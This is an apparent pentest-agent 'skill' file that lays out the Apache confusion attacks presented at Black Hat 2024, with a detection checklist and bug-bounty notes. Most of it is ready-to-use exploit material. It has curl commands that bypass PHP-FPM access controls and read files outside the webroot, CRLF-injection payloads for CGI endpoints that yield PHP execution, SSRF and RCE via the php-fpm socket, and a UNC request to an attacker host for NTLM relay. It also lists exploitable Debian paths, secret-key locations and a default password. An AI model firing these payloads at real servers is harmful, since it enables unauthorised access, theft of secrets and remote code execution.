---
name: apache-confusion-attacks
pattern: Apache Confusion Attacks
description: "Auto-trigger: Apache target, mod_rewrite, %3F truncation, handler confusion, PHP-FPM ACL bypass, DocumentRoot escape"
tech: [apache, php, php-fpm]
severity: Critical
triggers:
  - /scan
  - apache confusion
  - mod_rewrite bypass
  - handler confusion
  - php-fpm bypass
  - documentroot escape
related_patterns:
  - reverse-proxy-path-confusion
  - polyglot-file-upload-rce
  - tomcat-path-normalization-bypass
  - crlf-header-injection
sources:
  - "Orange Tsai (DEVCORE) — Black Hat USA 2024"
---

# Apache Confusion Attacks

## Crown Jewel Targets

- Apache + PHP-FPM default installations (ACL bypass on ALL `<Files>` auth)
- Debian/Ubuntu servers with `/usr/share` gadgets (phpinfo, LFI, SSRF, RCE)
- Apache with RewriteRules appending suffixes to user input
- Apache CGI endpoints vulnerable to CRLF injection (handler redirect)
- Windows Apache servers (UNC SSRF via encoded backslashes)
- Apache with `AllowEncodedSlashes On` + `MergeSlashes Off`

## Attack Surface Signals

- `Server: Apache/2.4.*` header
- PHP-FPM indicators: `X-Powered-By: PHP`, `.php` URLs
- RewriteRule indicators: clean URLs, URL rewriting patterns
- CGI endpoints: `/cgi-bin/`, Python/Perl CGI scripts
- Debian/Ubuntu OS: check error pages, package-specific paths

**Source:** Orange Tsai (DEVCORE), Black Hat USA 2024
**CVEs:** CVE-2024-38472 through CVE-2024-38477, CVE-2024-39573, CVE-2023-38709
**Affected:** Apache HTTP Server < 2.4.60

## Overview

Apache's modular architecture shares a mutable `request_rec` structure across ~136 modules. Different modules interpret the same fields (especially `r->filename` and `r->content_type`) with different semantics, creating exploitable confusion.

## Attack Type 1: Filename Confusion (mod_rewrite)

### Primitive 1-1: Path Truncation via %3F

`mod_rewrite` calls `splitout_queryargs()` after rewriting, truncating `r->filename` at encoded question marks.

**Pattern:** Any RewriteRule that appends a suffix to user input.

```apache
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"
```

**Exploit:** `curl http://server/user/orange%2Fsecret.yml%3F`
- Result: serves `/var/user/orange/secret.yml` (suffix truncated)

### Primitive 1-2: Handler Reassignment via %3F

```apache
RewriteRule ^(.+\.php)$ $1 [H=application/x-httpd-php]
```

**Exploit:** `curl http://server/upload/1.gif%3Fooo.php`
- Regex matches `.php`, applies PHP handler, then truncation removes query → GIF executed as PHP

### Primitive 1-3: ACL Bypass (PHP-FPM default config)

```apache
<Files "admin.php">
    Require valid-user
</Files>
```

**Exploit:** `http://server/admin.php%3Fooo.php`
- Auth module sees `admin.php?ooo.php` (no match for `admin.php`)
- PHP-FPM strips `?` suffix, executes `admin.php` without auth

**Critical:** This bypasses ALL `<Files>`-based auth on default PHP-FPM installations.

## Attack Type 2: DocumentRoot Confusion

For Server/VirtualHost RewriteRules, Apache checks if the rewritten path exists on the filesystem WITHOUT DocumentRoot prepended.

```apache
DocumentRoot /var/www/html
RewriteRule "^/html/(.*)$" "/$1.html"
```

**Exploit:** Combined with %3F truncation, read arbitrary files:
```bash
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# Returns CGI source code (not executed)
```

### Local Gadgets in /usr/share (Debian/Ubuntu)

Debian/Ubuntu allows `/usr/share` by default. Exploitable gadgets:

| Gadget | Path | Impact |
|--------|------|--------|
| phpinfo | `/usr/share/doc/websocketd/examples/php/dump-env.php` | Env leak |
| LFI | `/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php` | File read |
| SSRF | `/usr/share/php/magpierss/scripts/magpie_debug.php` | Full SSRF |
| XSS | `/usr/share/libreoffice/help/help.html` | Via version param |
| RCE | Old PHPUnit (CVE-2017-9841) | Code execution |
| RCE | phpLiteAdmin (default pw: admin) | DB write → PHP |
| Secrets | `/usr/share/redmine/instances/default/config/secret_key.txt` | Rails deser RCE |

### Symlink Jailbreaks

```
/usr/share/cacti/site/ → /var/log/cacti/
/usr/share/solr/conf/ → /etc/solr/conf/
/usr/share/simplesamlphp/config/ → /etc/simplesamlphp/
```

## Attack Type 3: Handler Confusion

Legacy Apache code (1996) uses `r->content_type` as handler when `r->handler` is empty.

### Primitive 3-2: CGI Local Redirect → Arbitrary Handler

When CGI returns `Status: 200` + `Location: /path`, Apache performs internal redirect carrying `r->content_type`.

**Via CRLF injection in CGI responses:**

```
# Information Disclosure (server-status bypass)
/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo%0d%0aContent-Type:server-status%0d%0a%0d%0a

# Execute uploaded file as PHP
/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/uploads/avatar.webp%0d%0aContent-Type:application/x-httpd-php%0d%0a%0d%0a

# Full SSRF via mod_proxy
/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:http://internal.host/%3F%0d%0a%0d%0a

# RCE via Unix socket → PHP-FPM
/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/shell.php%0d%0a%0d%0a
```

**Affects ALL CGI implementations:** mod_cgi, mod_cgid, mod_wsgi, mod_uwsgi, mod_fastcgi, mod_perl, mod_fcgid, mod_proxy_scgi.

## CVE-2024-38472: Windows UNC SSRF

```bash
# Requires: AllowEncodedSlashes On + MergeSlashes Off
curl http://server/%5C%5Cattacker-server/path
# Forces NTLM auth → relay to RCE
```

## CVE-2024-39573: SSRF via RewriteRule Prefix

```apache
RewriteRule ^/broken(.*) $1
```

```bash
curl http://server/brokenproxy:unix:/run/php/fpm.sock|http://path/
# Delegates to mod_proxy → SSRF to Unix sockets
```

## Detection Checklist

1. Check for RewriteRules in server config (`apache2.conf`, `httpd.conf`, vhost configs)
2. Test `%3F` truncation on any path with rewrite suffix
3. Check `/usr/share` gadgets on Debian/Ubuntu
4. Test CGI endpoints for CRLF injection
5. Verify `<Files>` vs `<Location>` auth on PHP-FPM setups
6. Check Windows servers for UNC SSRF via encoded backslashes

## Bug Bounty Relevance

- **HIGH**: ACL bypass on PHP-FPM → access admin panels without auth
- **HIGH**: DocumentRoot escape → read configs, secrets, source code
- **CRITICAL**: Handler confusion + CRLF → RCE via arbitrary handler invocation
- **CRITICAL**: UNC SSRF → NTLM relay → RCE on Windows

## Operator Notes (Battle-Tested)

- **`%3F` truncation is the universal Apache primitive**: Any RewriteRule appending a suffix to user input can be truncated. Test `path%3F` on every Apache target with clean URLs.
- **PHP-FPM default config = broken ACL**: `<Files "admin.php">` auth is bypassed by `admin.php%3Fooo.php`. This affects ALL default PHP-FPM installations. Test it everywhere.
- **DocumentRoot escape is devastating**: Server/VirtualHost RewriteRules + `%3F` truncation = read arbitrary files outside webroot. Check `/usr/share` gadgets on Debian/Ubuntu.
- **CGI CRLF → arbitrary handler**: CRLF injection in ANY CGI response can redirect to any file with any handler. `Content-Type:application/x-httpd-php` makes ANY file execute as PHP.
- **Handler confusion is from 1996 code**: Apache's legacy code uses `r->content_type` as handler when `r->handler` is empty. This is not a bug — it is a 30-year-old design decision.
- **Check `/usr/share` gadgets**: phpinfo at `/usr/share/doc/websocketd/examples/php/dump-env.php`, LFI at `/usr/share/doc/libphp-jpgraph-examples/`, SSRF at `/usr/share/php/magpierss/`, Redmine secret key.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `reverse-proxy-path-confusion` | General proxy confusion |
| `polyglot-file-upload-rce` | Handler confusion + uploaded file = RCE |
| `tomcat-path-normalization-bypass` | Java-specific path confusion |
| `crlf-header-injection` | CRLF in CGI for handler redirect |
| `windows-bestfit-unicode-attacks` | Windows Apache UNC SSRF |
